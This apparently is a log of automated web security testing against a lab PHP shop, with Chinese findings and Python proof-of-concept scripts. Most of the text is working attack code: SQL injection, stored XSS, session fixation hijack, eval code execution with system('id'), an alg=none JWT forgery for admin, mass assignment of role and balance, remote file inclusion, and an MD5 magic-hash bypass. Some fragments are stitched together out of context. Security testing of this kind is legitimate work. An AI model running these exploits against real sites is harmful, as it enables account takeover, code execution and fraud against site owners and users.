payload.summary: 钱包与订单入口审查确认两处可操作漏洞：orders/create.php 直接采用客户端提交的 price 计算订单总额与入库单价；wallet/withdraw.php 先读余额、sleep 350ms 再做无条件 UPDATE balance=?, WHERE 只含 id，构成 TOCTOU 竞态导致超额提现。两处均无服务端重算/条件写/事务保护。
payload.rationale: orders/create.php:3 从 $_POST['price'] 取值，第4行仅校验非负，第5行 total=price*quantity，第7行以该 price 写入 unit_price 与 total，未使用 $p 表中的服务端价格，攻击者可提交 price=0 下单。wallet/withdraw.php:4 读取余额，第5行比较，第6行 usleep(350000)，第7行 UPDATE users SET balance=? WHERE id=?，WHERE 不含余额条件也无 SELECT ... FOR UPDATE，并发请求可基于同一旧余额各自扣减并各自插入 withdrawals 记录（第8行），导致重复提现。bootstrap.php:40 提供 csrf 校验但不阻止同一会话并发重放。

payload.summary: ops/template-render.php 将 POST template 中 {{...}} 捕获组直接拼入 eval('return '.$m[1].';')，存在可利用的动态代码执行；ops/template-preview.php 将 GET template 直接 include，存在本地/远程文件包含。两者仅要求 operator/admin 会话并通过 CSRF 校验。
payload.rationale: template-render.php:2 读取 $_POST['template']，第3行在 POST 时 check_csrf 后以 preg_replace_callback 把 {{...}} 内容拼到 eval，内容无任何白名单/过滤，攻击者提交 {{system('id')}} 类表达式即可执行代码。template-preview.php:2 读取 $_GET['template']，第3行 if($template!=='')include $template，无路径白名单或 basename 约束，故本地任意路径文件包含成立，远程包含取决于 allow_url_include。bootstrap.php:33-36 的 require_user 仅做角色检查，不改写这两个 sink 的输入。

payload.summary: 已确认会话固定漏洞：login.php 第3行从 $_GET['sid'] 取值传入 start_session，bootstrap.php 第13行关闭 use_strict_mode、第17行对匹配字符集的 sid 直接调用 session_id() 后再 session_start()，攻击者可指定受害者会话 ID 并在受害者登录后复用该会话劫持身份。另确认 open_redirect（continue.php next 参数）与开放登录表单无会话令牌轮换，但会话固定为主发现。
payload.rationale: login.php:3 'start_session(isset($_GET["sid"]) ? (string)$_GET["sid"] : null)' 表明 sid 完全来自请求参数；bootstrap.php:13 'session.use_strict_mode','0' 关闭严格模式，17 行在正则 /^[a-zA-Z0-9,-]{16,64}$/D 校验后直接 session_id($sid)，18 行 session_start()，未生成新 ID 也无重新生成。login.php:8 认证成功后仅写 $_SESSION['user_id'] 并未 session_regenerate_id，因此攻击者预先设定的 SID 在受害者登录后仍是有效会话，构成会话固定。该根因与运行库中已存在结论一致（bootstrap.php:17），但本工作项已独立读取原始行号确认。此外 continue.php:3 直接从 $_GET['next'] 重定向构成开放重定向，属独立根因。

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
def req(path, data=None, headers=None):
    url = base + path
    h = {"Accept": "application/json"}
    if headers: h.update(headers)
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    r = urllib.request.Request(url, data=body, headers=h)
    try:
        resp = op.open(r, timeout=10)
        return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
# login
code, txt = req("/auth/login.php", {"username": user, "password": pwd})
assert "SHOPSESSID" in [c.name for c in cj], "login failed"
# get csrf from update form
code, form = req("/account/update.php")
m = re.search(r'name="csrf" value="([^"]+)"', form)
token = m.group(1)
print("normal status", code, "csrf", token[:8])
# control: benign field
c1, t1 = req("/account/update.php", {"csrf": token, "display_name": "Alice", "homepage": "https://example.com"})
print("NORMAL RESP", c1, t1[:300])
# attack: mass-assign role and balance
c2, t2 = req("/account/update.php", {"csrf": token, "role": "admin", "balance": "999999", "tier": "gold"})
print("ATTACK RESP", c2, t2[:300])
# verify via me.php and ops/users.php
c3, t3 = req("/account/me.php")
print("ME RESP", c3, t3[:400])
c4, t4 = req("/ops/users.php", headers={"Cookie": "role=admin"})
print("OPS USERS", c4, t4[:200])
'''

import os, re, json, urllib.request, urllib.parse, http.cookiejar
BASE = os.environ["LAB30_URL"].rstrip("/")
jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
op.open(BASE + "/auth/login.php", timeout=10).read()
r = op.open(BASE + "/auth/login.php", timeout=10, data=urllib.parse.urlencode({
    "username": os.environ["LAB30_USER"], "password": [redacted]"LAB30_PASSWORD"],
}).encode())
print("LOGIN", r.status)
m = op.open(BASE + "/orders/index.php", timeout=10)
assert m.status == 200 and "/auth/login.php" not in m.url, "会员登录未生效"
print("MEMBER_SESSION", m.status)

form = op.open(BASE + "/account/update.php", timeout=10).read().decode("utf-8", "replace")
tok = re.search(r'name="csrf" value="([^"]+)"', form)
assert tok, "未找到 csrf"
print("CSRF_FOUND", bool(tok.group(1)))

PAYLOAD = "x' UNION SELECT username,email,role FROM users-- -"
data = urllib.parse.urlencode({"csrf": tok.group(1), "nickname": PAYLOAD}).encode()
req = urllib.request.Request(BASE + "/account/update.php", data=data)
req.add_header("Accept", "application/json")
resp = op.open(req, timeout=10)
body = resp.read().decode("utf-8", "replace")
print("UPDATE_STATUS", resp.status)
print("UPDATE_BODY", body)
try:
    j = json.loads(body)
    print("STORED_NICKNAME", repr(j.get("nickname")))
    print("NICKNAME_MATCH", j.get("nickname") == PAYLOAD)
except Exception as e:
    print("JSON_ERR", e)
print("PAYLOAD", repr(PAYLOAD))

args.script:
import os, re, urllib.request, urllib.parse, http.cookiejar
BASE = os.environ["LAB30_URL"].rstrip("/")
jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
op.open(BASE + "/auth/login.php", timeout=10).read()
r = op.open(BASE + "/auth/login.php", timeout=10, data=urllib.parse.urlencode({
    "username": os.environ["LAB30_USER"], "password": [redacted]"LAB30_PASSWORD"],
}).encode())
print("LOGIN", r.status)
m = op.open(BASE + "/orders/index.php", timeout=10)
assert m.status == 200 and "/auth/login.php" not in m.url, "会员登录未生效"
print("MEMBER_SESSION", m.status)

page = op.open(BASE + "/support/messages.php", timeout=10).read().decode("utf-8", "replace")
tok = re.search(r'name="csrf" value="([^"]+)"', page)
assert tok, "未找到 csrf"
print("CSRF_FOUND", bool(tok.group(1)))

PAYLOAD = "<script>alert('XSS43b0838f')</script>"
data = urllib.parse.urlencode({"csrf": tok.group(1), "message": PAYLOAD}).encode()
req = urllib.request.Request(BASE + "/support/messages.php", data=data)
resp = op.open(req, timeout=10)
body = resp.read().decode("utf-8", "replace")
print("POST_FINAL_STATUS", resp.status, "URL", resp.url)
print("PAYLOAD_RAW_IN_PAGE", PAYLOAD in body)
i = body.find("message-body")
print("AROUND", body[max(0, i-40):i+120].replace("\n", " "))
print("PAYLOAD", PAYLOAD)

args.script:
import os, urllib.request, urllib.parse, urllib.error, http.cookiejar
BASE = os.environ["LAB30_URL"].rstrip("/")
USER = os.environ["LAB30_USER"]; PW = os.environ["LAB30_PASSWORD"]

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def open_soft(opener, req):
    try:
        r = opener.open(req, timeout=10)
        return r.status, r.headers, r.read().decode("utf-8", "replace"), r.url
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read().decode("utf-8", "replace"), e.url

FIXED_SID = "fixation4c55def3684b4d94"

# --- 正常侧: 无凭据、无 cookie 的客户端访问会员页 ---
attacker = urllib.request.build_opener(NoRedirect)
s, h, b, u = open_soft(attacker, urllib.request.Request(BASE + "/orders/index.php"))
print("BASELINE_NO_COOKIE_STATUS", s)
print("BASELINE_AUTH_PAGE", "/auth/login.php" in b or "请先登录" in b)

# --- 受害者使用攻击者预设的 ?sid= 登录 ---
victim_jar = http.cookiejar.CookieJar()
victim = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(victim_jar), NoRedirect)
s1, h1, b1, u1 = open_soft(victim, urllib.request.Request(BASE + "/auth/login.php?sid=" + FIXED_SID))
print("PRELOGIN_STATUS", s1)
print("PRELOGIN_SET_COOKIE", h1.get_all("Set-Cookie"))
data = urllib.parse.urlencode({"username": USER, "password": [redacted]}).encode()
s2, h2, b2, u2 = open_soft(victim, urllib.request.Request(BASE + "/auth/login.php?sid=" + FIXED_SID, data=data))
print("LOGIN_POST_STATUS", s2)
print("LOGIN_LOCATION", h2.get("Location"))
print("LOGIN_SET_COOKIE", h2.get_all("Set-Cookie"))
print("VICTIM_JAR", [(c.name, c.value) for c in victim_jar])
print("COOKIE_EQUALS_FIXED", any(c.name == "SHOPSESSID" and c.value == FIXED_SID for c in victim_jar))

# --- 攻击者仅凭预设 SID、从未提交凭据，复用会话 ---
for path in ["/orders/index.php", "/account/index.php"]:
    req = urllib.request.Request(BASE + path)
    req.add_header("Cookie", "SHOPSESSID=" + FIXED_SID)
    s, h, b, u = open_soft(attacker, req)
    print("ATTACKER", path, "STATUS", s, "FINAL_URL", u)
    print("ATTACKER", path, "HAS_LOGOUT", "退出" in b, "HAS_LOGIN_LINK", "/auth/login.php" in b)
    print("ATTACKER", path, "SNIPPET", b[b.find("topbar"):b.find("topbar")+160].replace("\n", " ") if "topbar" in b else b[:160].replace("\n", " "))

import os, re, urllib.request, urllib.parse, http.cookiejar
base = os.environ['LAB30_URL'].rstrip('/')
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
def get(u):
    return opener.open(base + u, timeout=10)
login = get('/auth/login.php')
body = login.read().decode('utf-8', 'replace')
fields = {'username': os.environ['LAB30_USER'], 'password': [redacted]'LAB30_PASSWORD']}
m = re.search(r'name="csrf" value="([^"]+)"', body)
if m: fields['csrf'] = m.group(1)
post = urllib.request.Request(base + '/auth/login.php', data=urllib.parse.urlencode(fields).encode(), method='POST')
print('login', opener.open(post, timeout=10).status)
page = get('/ops/template-render.php').read().decode('utf-8', 'replace')
tok = re.search(r'name="csrf" value="([^"]+)"', page).group(1)
def send(t):
    data = urllib.parse.urlencode({'csrf': tok, 'template': t}).encode()
    r = opener.open(urllib.request.Request(base + '/ops/template-render.php', data=data, method='POST'), timeout=10)
    return r.status, r.read().decode('utf-8', 'replace')
print('normal', send('total {{ 2 + 2 }}')[0])
print('attack', send('{{ system("id") }}'))

import os,json,base64,urllib.request,urllib.parse,urllib.error,http.cookiejar
B=os.environ['LAB30_URL'].rstrip('/')
cj=http.cookiejar.CookieJar();o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
o.open(B+'/auth/login.php',timeout=10).read()
o.open(B+'/auth/login.php',timeout=10,data=urllib.parse.urlencode({'username':os.environ['LAB30_USER'],'password':[redacted]'LAB30_PASSWORD']}).encode()).read()
req=urllib.request.Request(B+'/partner/token.php');req.add_header('Accept','application/json')
legit=json.loads(o.open(req,timeout=10).read().decode())['token']
p=legit.split('.')[1];pad='='*(-len(p)%4)
print('LEGIT_PAYLOAD',base64.urlsafe_b64decode(p+pad).decode())
guest=urllib.request.build_opener()
def post(tok):
 req=urllib.request.Request(B+'/partner/portal.php',data=urllib.parse.urlencode({'token':tok}).encode())
 req.add_header('Accept','application/json')
 try:
  r=guest.open(req,timeout=10);return r.status,r.read().decode('utf-8','replace')
 except urllib.error.HTTPError as e:
  return e.code,e.read().decode('utf-8','replace')
s,b=post('');print('BASELINE_NOTOKEN',s,b[:150])
s,b=post(legit);print('NORMAL_CUSTOMER',s,b[:150])
def b64(o):
 return base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
h=b64({'alg':'none','typ':'JWT'});pl=b64({'role':'admin'});forged=h+'.'+pl+'.x'
print('FORGED_PAYLOAD_B64',pl)
s,b=post(forged);print('ATTACK',s,b[:500]);print('HAS_ORDER','SG-' in b,'ROLE_ADMIN','"role":"admin"' in b)

opener.open(BASE + "/auth/login.php", timeout=10).read()

    "username": os.environ["LAB30_USER"], "password": [redacted]"LAB30_PASSWORD"],

        print(label, r.status, "LEN", len(body), "BODY", repr(body[:400]))
    except urllib.error.HTTPError as e:
        print(label, e.code, "ERRBODY", repr(e.read(200)))

args.script:
import os, json, base64, urllib.request, urllib.parse, urllib.error, http.cookiejar
BASE = os.environ["LAB30_URL"].rstrip("/")

def b64url(o):
    return base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")

# member session only to obtain the legitimate customer token for the normal side
jar = http.cookiejar.CookieJar()
login = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
login.open(BASE + "/auth/login.php", timeout=10).read()
try:
    login.open(BASE + "/auth/login.php", timeout=10, data=urllib.parse.urlencode({
        "username": os.environ["LAB30_USER"], "password": [redacted]"LAB30_PASSWORD"],
    }).encode()).read()
except urllib.error.HTTPError as e:
    print("LOGIN_POST", e.code)
req = urllib.request.Request(BASE + "/partner/token.php", headers={"Accept": "application/json"})
r = login.open(req, timeout=10)
tok = json.loads(r.read().decode())["token"]
payload = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "==").decode())
print("LEGIT_PAYLOAD", json.dumps(payload, ensure_ascii=False))
r = login.open(BASE + "/orders/index.php", timeout=10)
print("MEMBER_SESSION", r.status, "/auth/login.php" in r.url)

# attacker: no cookies at all
guest = urllib.request.build_opener()

def post(label, token):
    body = urllib.parse.urlencode({"token": token}).encode() if token is not None else b""
    req = urllib.request.Request(BASE + "/partner/portal.php", data=body,
                                 headers={"Accept": "application/json",
                                          "Content-Type": "application/x-www-form-urlencoded"})
    try:
        x = guest.open(req, timeout=10)
        print(label, x.status, x.read(300).decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        print(label, e.code, e.read(200).decode("utf-8", "replace"))

forged = b64url({"alg": "none", "typ": "JWT"}) + "." + b64url({"role": "admin"}) + ".x"
post("BASELINE_NOTOKEN", None)
post("NORMAL_CUSTOMER", tok)
post("ATTACK_FORGED", forged)

import os, re, urllib.request, urllib.parse, urllib.error, http.cookiejar
BASE = os.environ["LAB30_URL"].rstrip("/")
jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
op.open(BASE + "/auth/login.php", timeout=10).read()
try:
    op.open(BASE + "/auth/login.php", timeout=10, data=urllib.parse.urlencode({
        "username": os.environ["LAB30_USER"], "password": [redacted]"LAB30_PASSWORD"],
    }).encode()).read()
except urllib.error.HTTPError as e:
    print("LOGIN_POST", e.code)
r = op.open(BASE + "/ops/index.php", timeout=10)
print("OPERATOR_SESSION", r.status, "/auth/login.php" in r.url)

def fetch(label, tpl):
    url = BASE + "/ops/template-preview.php"
    if tpl is not None:
        url += "?" + urllib.parse.urlencode({"template": tpl})
    try:
        x = op.open(url, timeout=20)
        b = x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        print(label, "STATUS", e.code, "BODY", repr(e.read(200).decode("utf-8", "replace")))
        return
    m = re.search(r'id="remote-template">(.*?)</section>', b, re.S)
    print(label, "STATUS", x.status, "REMOTE_SECTION", repr(m.group(1) if m else None))
    print(label, "HAS_LITERAL_PHP", "<?php" in b, "HAS_SEASON_MARKUP", "合作方 · 秋日生活提案" in b)

fetch("NORMAL_NO_TEMPLATE", None)
fetch("REMOTE_SEASON_PHP", "http://fixtures:8080/templates/season.php")
fetch("REMOTE_CATALOG_INFO", "http://fixtures:8080/catalog-info")

redeem.php:4 $secret_hash=md5('240610708') 得 0e462097431906509019562988736854，:5 用 == 比较 md5($_POST['token']) 与它，两侧 0e 前缀纯数字字符串按数字相等，弱类型绕过成立，随后执行 UPDATE users SET tier='gold'。同版本验证 68f88c599e974fcaace48aa481a4ae3c 正常侧提交 wrong-token 得 422 且未升级，攻击侧提交 QNKCDZO（md5=0e830400451993494058024219903391）得 200 accepted=true 且 tier 由 standard 变为 gold。证据完整，接受该弱类型比较结论，AC:H 与需命中魔法值相符。
